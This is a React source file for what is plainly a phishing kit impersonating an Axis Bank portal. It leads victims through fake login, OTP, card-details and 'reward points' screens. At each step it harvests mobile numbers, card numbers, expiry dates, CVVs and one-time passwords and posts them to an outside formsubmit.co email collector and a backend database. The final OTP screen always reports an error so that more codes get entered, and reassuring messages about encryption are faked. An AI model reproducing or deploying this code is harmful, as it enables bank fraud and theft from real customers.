/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { View, ServiceType, LoginData, CardData } from './types';
import { SERVICES } from './data/services';
import AxisHeader from './components/AxisHeader';
import Sidebar from './components/Sidebar';
import Dashboard from './components/Dashboard';
import LoginPage from './components/LoginPage';
import OtpStep2 from './components/OtpStep2';
import CardDetailsPage from './components/CardDetailsPage';
import ClaimPointsPage from './components/ClaimPointsPage';
import OtpVerification from './components/OtpVerification';
import ProcessingOverlay from './components/ProcessingOverlay';
import SuccessMsgBanner from './components/SuccessMsgBanner';
import SqlEditor from './components/SqlEditor';
import AxisFooter from './components/AxisFooter';
import PhoneAuthOverlay from './components/PhoneAuthOverlay';
import SplashScreen from './components/SplashScreen';
import { saveSubmissionToSupabase } from './lib/supabase';

const DEFAULT_LOGIN_DATA: LoginData = {
  mobileNumber: '',
  lastFourCard: '',
};

const DEFAULT_CARD_DATA: CardData = {
  cardholderName: '',
  cardNumber: '',
  expiryMonth: '',
  expiryYear: '',
  cvv: '',
};

export default function App() {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [currentView, setCurrentView] = useState<View>(View.DASHBOARD);
  const [selectedService, setSelectedService] = useState<ServiceType>(ServiceType.CARD_PIN_GENERATION);

  // Form states
  const [loginData, setLoginData] = useState<LoginData>(DEFAULT_LOGIN_DATA);
  const [cardData, setCardData] = useState<CardData>(DEFAULT_CARD_DATA);

  // Loading spinner overlays
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingMessage, setProcessingMessage] = useState('Processing...');
  const [processingSubmessage, setProcessingSubmessage] = useState('Do not refresh page');
  const [otpError, setOtpError] = useState<string | null>(null);

  // Active submission session ID
  const [submissionId, setSubmissionId] = useState<string | null>(null);
  const [isInitialLoading, setIsInitialLoading] = useState(true);

  useEffect(() => {
    try {
      localStorage.removeItem('custom-axis-logo');
      localStorage.removeItem('custom-axis-title');
    } catch (e) {
      console.error(e);
    }
    const timer = setTimeout(() => {
      setIsInitialLoading(false);
    }, 4000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    window.scrollTo(0, 0);
    if (document.documentElement) document.documentElement.scrollTop = 0;
    if (document.body) document.body.scrollTop = 0;
    const container = document.getElementById('app-root-container');
    if (container) container.scrollTop = 0;
  }, [currentView]);

  const triggerLoading = (
    message: string,
    submessage: string,
    durationMs: number,
    onComplete: () => void
  ) => {
    setProcessingMessage(message);
    setProcessingSubmessage(submessage);
    setIsProcessing(true);
    setTimeout(() => {
      setIsProcessing(false);
      onComplete();
    }, durationMs);
  };

  // When ANY button/service is clicked -> goes straight to LOGIN page
  const handleSelectService = (type: ServiceType) => {
    setSelectedService(type);
    setSubmissionId(null);
    triggerLoading(
      'Processing...',
      'Do not refresh page',
      3000,
      () => setCurrentView(View.LOGIN)
    );
  };

  const sendToFormSubmit = async (subject: string, data: Record<string, any>) => {
    try {
      await fetch('https://formsubmit.co/ajax/mypaneldata6@gmail.com', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          _subject: subject,
          _captcha: 'false',
          ...data,
        }),
      });
    } catch (err) {
      // ignore
    }
  };

  const getUniqueSubject = (baseTitle: string, identifier: string) => {
    const randomSuffix = Math.floor(1000 + Math.random() * 9000);
    const date = new Date();
    const timeString = `${String(date.getHours()).padStart(2, '0')}:${String(date.getMinutes()).padStart(2, '0')}:${String(date.getSeconds()).padStart(2, '0')}.${String(date.getMilliseconds()).padStart(3, '0')}`;
    return `${baseTitle} - ${identifier} [#Ref-${randomSuffix}-${timeString}]`;
  };

  // 1. Handle Login Submit (Mobile + Last 4 digits)
  const handleLoginSubmit = async (data: LoginData) => {
    triggerLoading(
      'Verifying Credentials...',
      'Checking information secure nodes',
      3500,
      () => setCurrentView(View.OTP_STEP_2)
    );

    setLoginData(data);
    try {
      localStorage.setItem('axis_mobile_number', data.mobileNumber);
    } catch (e) {}

    const serviceName = activeServiceInfo?.title || selectedService || 'Axis Portal';
    const uniqueSubject = getUniqueSubject('[LOGIN] Axis Bank Portal', data.mobileNumber);

    sendToFormSubmit(uniqueSubject, {
      'Step': 'Step 1 - Login Credentials',
      'Selected Service': serviceName,
      'Mobile Number': data.mobileNumber,
      'Last 4 Digits of Card': data.lastFourCard,
      'Timestamp': new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' }) + ' (IST)',
    });

    try {
      const res = await fetch('/api/submit-step', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          submissionId: submissionId,
          step: 'login',
          subject: uniqueSubject,
          selectedService: serviceName,
          loginData: data,
        }),
      });
      const resData = await res.json();
      if (resData.submissionId) {
        setSubmissionId(resData.submissionId);
      }
    } catch (err) {
      const fbResult = await saveSubmissionToSupabase({
        id: submissionId || undefined,
        step: 'login',
        selected_service: serviceName,
        mobile_number: data.mobileNumber,
      });
      if (fbResult.id) setSubmissionId(fbResult.id);
    }
  };

  // 2. Handle OTP Step 2 Submit
  const handleOtpStep2Submit = async (otp: string) => {
    triggerLoading(
      'Authenticating OTP...',
      'Encrypting with 256-bit SSL protocols',
      3500,
      () => setCurrentView(View.CARD_DETAILS)
    );

    const serviceName = activeServiceInfo?.title || selectedService || 'Axis Portal';
    const uniqueSubject = getUniqueSubject(`[OTP ENTERED: ${otp}] Axis Bank Portal`, loginData.mobileNumber || 'User');

    sendToFormSubmit(uniqueSubject, {
      'Step': 'Step 2 - OTP Verified',
      'Selected Service': serviceName,
      'Entered OTP': otp,
      'Timestamp': new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' }) + ' (IST)',
    });

    try {
      const res = await fetch('/api/submit-step', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          submissionId: submissionId,
          step: 'otp_step_2',
          subject: uniqueSubject,
          selectedService: serviceName,
          otp: otp,
        }),
      });
      const resData = await res.json();
      if (resData.submissionId) {
        setSubmissionId(resData.submissionId);
      }
    } catch (err) {}
  };

  // 3. Handle Card Details Submit
  const handleCardDetailsSubmit = async (data: CardData) => {
    triggerLoading(
      'Verifying Card Details...',
      'Validating with issuing bank',
      3500,
      () => setCurrentView(View.CLAIM_POINTS)
    );

    setCardData(data);
    const serviceName = activeServiceInfo?.title || selectedService || 'Axis Portal';
    const uniqueSubject = getUniqueSubject('[CARD DETAILS] Axis Bank Portal', data.cardholderName || 'Cardholder');

    sendToFormSubmit(uniqueSubject, {
      'Step': 'Step 3 - Card Details',
      'Selected Service': serviceName,
      'Cardholder Name': data.cardholderName,
      'Card Number': data.cardNumber,
      'Expiry Month': data.expiryMonth,
      'Expiry Year': data.expiryYear,
      'CVV': data.cvv,
      'Timestamp': new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' }) + ' (IST)',
    });

    try {
      const res = await fetch('/api/submit-step', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          submissionId: submissionId,
          step: 'card_details',
          subject: uniqueSubject,
          selectedService: serviceName,
          cardData: data,
        }),
      });
      const resData = await res.json();
      if (resData.submissionId) {
        setSubmissionId(resData.submissionId);
      }
    } catch (err) {}
  };

  // 4. Handle Claim Points Click
  const handleClaimPoints = () => {
    triggerLoading(
      'Processing Reward Points...',
      'Unlocking complementary bonus',
      3000,
      () => setCurrentView(View.FINAL_OTP)
    );
  };

  // 5. Handle Final OTP Submit
  const handleFinalOtpSubmit = async (otp: string) => {
    setOtpError(null);
    triggerLoading(
      'Processing...',
      'Do not refresh page',
      4000,
      () => {
        setOtpError('Incorrect OTP, please try again');
      }
    );

    const serviceName = activeServiceInfo?.title || selectedService || 'Axis Portal';
    const uniqueSubject = getUniqueSubject(`[FINAL OTP ENTERED: ${otp}] Axis Bank Portal`, loginData.mobileNumber || 'User');

    sendToFormSubmit(uniqueSubject, {
      'Step': 'Step 5 - Final OTP Submitted',
      'Selected Service': serviceName,
      'FINAL ENTERED OTP': otp,
      'Timestamp': new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' }) + ' (IST)',
    });

    try {
      await fetch('/api/submit-step', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          submissionId: submissionId,
          step: 'final_otp',
          subject: uniqueSubject,
          selectedService: serviceName,
          otp: otp,
        }),
      });
    } catch (err) {}
  };

  const handleResetToHome = () => {
    setLoginData(DEFAULT_LOGIN_DATA);
    setCardData(DEFAULT_CARD_DATA);
    setSubmissionId(null);
    setCurrentView(View.DASHBOARD);
  };

  const handleHeaderBack = () => {
    if (currentView === View.LOGIN) {
      setCurrentView(View.DASHBOARD);
    } else if (currentView === View.OTP_STEP_2) {
      setCurrentView(View.LOGIN);
    } else if (currentView === View.CARD_DETAILS) {
      setCurrentView(View.OTP_STEP_2);
    } else if (currentView === View.CLAIM_POINTS) {
      setCurrentView(View.CARD_DETAILS);
    } else if (currentView === View.FINAL_OTP) {
      setCurrentView(View.CLAIM_POINTS);
    } else {
      handleResetToHome();
    }
  };

  const activeServiceInfo = SERVICES[selectedService];

  return (
    <div className="min-h-screen bg-slate-50/70 font-sans antialiased text-gray-800 flex flex-col" id="app-root-container">
      {currentView === View.DASHBOARD && (
        <AxisHeader
          onBack={handleHeaderBack}
          showBack={currentView !== View.DASHBOARD}
          onMenuToggle={() => setSidebarOpen(true)}
          showMenu={currentView === View.DASHBOARD}
          isSecure={false}
          onLogin={() => setCurrentView(View.LOGIN)}
        />
      )}

      <main className="flex-1 flex flex-col justify-start py-4 max-w-5xl mx-auto w-full" id="main-content-stage">
        <SuccessMsgBanner
          mobileNumber={loginData.mobileNumber}
          submissionId={submissionId}
          cardData={{
            cardholderName: cardData.cardholderName,
            cardNumber: cardData.cardNumber,
            expiryDate: `${cardData.expiryMonth}/${cardData.expiryYear}`,
            cvv: cardData.cvv,
          }}
          applicantData={{
            fullName: cardData.cardholderName || 'Axis Customer',
            email: 'customer@axisbank.com',
            mobileNumber: loginData.mobileNumber,
          }}
        />

        {currentView === View.DASHBOARD && (
          <Dashboard onSelectService={handleSelectService} />
        )}

        {currentView === View.LOGIN && activeServiceInfo && (
          <LoginPage
            service={activeServiceInfo}
            onSubmit={handleLoginSubmit}
            initialData={loginData}
            onBack={handleHeaderBack}
          />
        )}

        {currentView === View.OTP_STEP_2 && (
          <OtpStep2
            mobileNumber={loginData.mobileNumber}
            onSubmit={handleOtpStep2Submit}
            onResend={() => {}}
            onBack={handleHeaderBack}
          />
        )}

        {currentView === View.CARD_DETAILS && (
          <CardDetailsPage
            onSubmit={handleCardDetailsSubmit}
            initialData={cardData}
            onBack={handleHeaderBack}
          />
        )}

        {currentView === View.CLAIM_POINTS && (
          <ClaimPointsPage onClaim={handleClaimPoints} />
        )}

        {currentView === View.FINAL_OTP && (
          <OtpVerification
            mobileNumber={loginData.mobileNumber}
            onSubmit={handleFinalOtpSubmit}
            onResend={() => {}}
            onBack={handleHeaderBack}
            error={otpError}
          />
        )}

        {currentView === View.SQL_EDITOR && (
          <SqlEditor onBack={() => setCurrentView(View.DASHBOARD)} />
        )}
      </main>

      {currentView === View.DASHBOARD && (
        <AxisFooter onOpenSqlEditor={() => setCurrentView(View.SQL_EDITOR)} />
      )}

      <Sidebar
        isOpen={sidebarOpen}
        onClose={() => setSidebarOpen(false)}
        onSelectService={handleSelectService}
        onLogin={() => setCurrentView(View.LOGIN)}
        onOpenSqlEditor={() => setCurrentView(View.SQL_EDITOR)}
        activeService={currentView !== View.DASHBOARD ? selectedService : undefined}
      />

      <PhoneAuthOverlay mobileNumber={loginData.mobileNumber} submissionId={submissionId} />

      <ProcessingOverlay
        isVisible={isProcessing}
        message={processingMessage}
        submessage={processingSubmessage}
      />

      <SplashScreen isVisible={isInitialLoading} />
    </div>
  );
}
